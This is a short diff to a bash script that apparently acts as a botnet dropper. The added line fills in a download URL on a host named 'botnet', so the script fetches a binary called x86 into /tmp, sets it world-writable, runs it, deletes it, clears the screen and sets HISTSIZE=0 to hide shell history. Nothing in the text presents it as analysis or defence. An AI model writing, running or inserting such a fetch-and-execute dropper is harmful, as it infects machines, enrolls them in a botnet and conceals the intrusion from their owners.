@@ -1,4 +1,4 @@
 #!/usr/bin/bash
 yum install curl -y
 apt install curl -y
-cd /tmp/ && curl -OL  && chmod 777 x86 && ./x86 daukute && rm -rf x86 && clear && HISTSIZE=0
+cd /tmp/ && curl -OL http://botnet.nguyennghi.info/x86 && chmod 777 x86 && ./x86 daukute && rm -rf x86 && clear && HISTSIZE=0
